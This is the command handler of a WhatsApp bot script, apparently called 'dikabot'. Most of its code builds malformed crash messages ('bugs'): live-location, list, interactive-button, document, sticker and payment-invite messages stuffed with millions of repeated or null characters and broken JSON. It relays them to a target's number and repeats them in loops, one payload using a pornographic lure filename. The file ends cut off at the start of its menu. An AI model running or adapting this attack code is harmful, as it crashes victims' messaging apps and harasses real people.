//===================================
require('./settings')
require('./lib/language')
require('./lib/virtex/virus')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = global.baileys1
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const jsobfus = require('javascript-obfuscator');
const { JSDOM } = require('jsdom')
module.exports = dikabot = async (dikabot, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/database/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await dikabot.decodeJid(dikabot.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await dikabot.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const dikabotimage = fs.readFileSync('./lib/thumb/dikabot.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const dikagamb = fs.readFileSync('./lib/thumb/dikagamb.jpeg')
const bugthumb = fs.readFileSync ('./lib/thumb/mamak.jpg')
const { startbot, stopjadibot } = require('./lib/start')
const responbug = 'sebentar... tunggu prosesnya selesai '
//===================================
if (!dikabot.public) {
if (!isCreator) return
}
//===================================
if (command) {
console.log("");
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}
//===================================
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
dikabot.sendPresenceUpdate(jd, from)
}
//===================================
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}
//===================================
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
//===================================
dikabot.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await dikabot.sendPresenceUpdate('composing', jid)
      return dikabot.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   
//===================================
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": dikabotimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝖡𝖱𝖴𝖳𝖠𝖫𝖨𝖳𝖸 𝖡𝖸 𝖣𝖨𝖪𝖠 𝖨𝖣\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
//===================================
const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴`
}
}
}
//===================================
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴`+"ꦾ".repeat(60000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await dikabot.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(60000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    dikabot.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}
//===================================
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.postimg.cc/Q86pPcsn/dikabot.jpg" } }, { upload: dikabot.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(3000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await dikabot.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//===================================
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `BOKEP JAV TERBARU`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await dikabot.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await dikabot.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴" + "\0".repeat(10000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await dikabot.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+"ꦾ".repeat(60000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await dikabot.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
          },
          'footer': {
            'text': 'dikaganteng'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : '𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(3000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await dikabot.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  dikabot.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(60000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendLiveLocationMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(500)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴`
}
}
}

async function iponcrash(target) {
await dikabot.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await dikabot.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await dikabot.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
    },
    "footer": {
      "text": "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(3000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await dikabot.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(500)
sendExtendedTextMessage(jid)
}

async function LiveLocVIP(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: 'ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ'.repeat(55000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await dikabot.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
async function ListMSGVIP(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title: 'dikabot'+'\0'.repeat(999999),
                footerText: '.',
                description: '.',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'anjay',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'puki',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: true,
            },
        }),
        { userJid: userJid }
    );
    await dikabot.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function LiveLocVIP2(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: 'Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½' + 'Ãª¦¾'.repeat(60000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await dikabot.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function ListMSGVIP2(recipientJid) {
  const messageContent = generateWAMessageFromContent(
    recipientJid,
    proto.Message.fromObject({
      listMessage: {
        title: 'SÃŒ¸YÃª™°ÃŒ¸SÃª™°ÃŒ¸TÃª™°ÃŒ¸EÃª™°ÃŒ¸MÃª™°ÃŒ¸ UÃŒ¸IÃŒ¸ CÃŒ¸RÃª™°ÃŒ¸AÃª™°ÃŒ¸SÃª™°ÃŒ¸HÃª™°ÃŒ¸' + '\0'.repeat(10000), 
        footerText: 'Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®',
        description: 'Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®',
        buttonText: null,
        listType: 2,
        productListInfo: {
          productSections: [
            {
              title: 'lol',
              products: [{ productId: '4392524570816732' }],
            },
          ],
          productListHeaderImage: {
            productId: '4392524570816732',
            jpegThumbnail: null,
          },
          businessOwnerJid: '0@s.whatsapp.net',
        },
      },
      footer: 'lol',
      contextInfo: {
        expiration: 600000,
        ephemeralSettingTimestamp: '1679959486',
        entryPointConversionSource: 'global_search_new_chat',
        entryPointConversionApp: 'whatsapp',
        entryPointConversionDelaySeconds: 9,
        disappearingMode: { initiator: 'INITIATED_BY_ME' },
      },
      selectListType: 2,
      product_header_info: {
        product_header_info_id: 292928282928,
        product_header_is_rejected: false,
      },
    }),
    { userJid: recipientJid }
  );

  await dikabot.relayMessage(recipientJid, messageContent.message, {
    participant: { jid: recipientJid },
    messageId: messageContent.key.id,
  });
}


async function ListMSGVIP3(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: 'dikabot',
                        },
                        body: {
                            text: 'dikabot',
                        },
                        footer: {
                            text: 'dikabot',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : 'dikabot', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'dikabot', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : 'dikabot', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await dikabot.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
async function LiveLocVIP3(recipientJid) {
    var liveLocationMessage = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption:
                  'ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ' +
                  'ê¦¾'.repeat(60000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: recipientJid }
    );
    await dikabot.relayMessage(recipientJid, liveLocationMessage.message, {
        participant: { jid: recipientJid },
        messageId: liveLocationMessage.key.id,
    });
}
async function BugButtonVIP(recipientJid) {
    var interactiveMessage = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '',
                        },
                        body: { text: '' },
                        footer: { text: '' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson:
                        '{ display_text : " ", url : , merchant_url : " "}',
                                },
                            ],
                            messageParamsJson: '\0'.repeat(3000000),
                        },
                    },
                },
            },
        }),
        { userJid: recipientJid }
    );
    await dikabot.relayMessage(recipientJid, interactiveMessage.message, {
        participant: { jid: recipientJid },
        messageId: interactiveMessage.key.id,
    });
}

async function ListMSGVIP4(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              'ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ' + '\0'.repeat(10000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'anjay',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'puki',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await dikabot.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const replyy = (teks) => {
return dikabot.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `CREATOR SCRIPT`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": dikabotimage,"sourceUrl": `https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d`}}}, { quoted:m})} 

const replyz = (teks) => { 
dikabot.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `DIKA ID`,
body: `Hai 👋 ${m.pushName}`,
previewType: "1",
thumbnail: dikabotimage,
sourceUrl: `https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d`,
mediaUrl: `https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d`
}
},
text: teks
}, {
quoted: m
}) 
}

const dikabotbugnew = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴`
}
}
}

switch(command) {
//===================================
case 'menu': 
case 'help': 
case 'dika': 
{
replyz(
`Hai *${pushname}* saya adalah *${global.botname}* yang siap membantu anda. Untuk tampilan bisa kalian cek sendiri ya!

\`LIST MENU BY DIKA ID\`
⭔ ${prefix}bugmenu
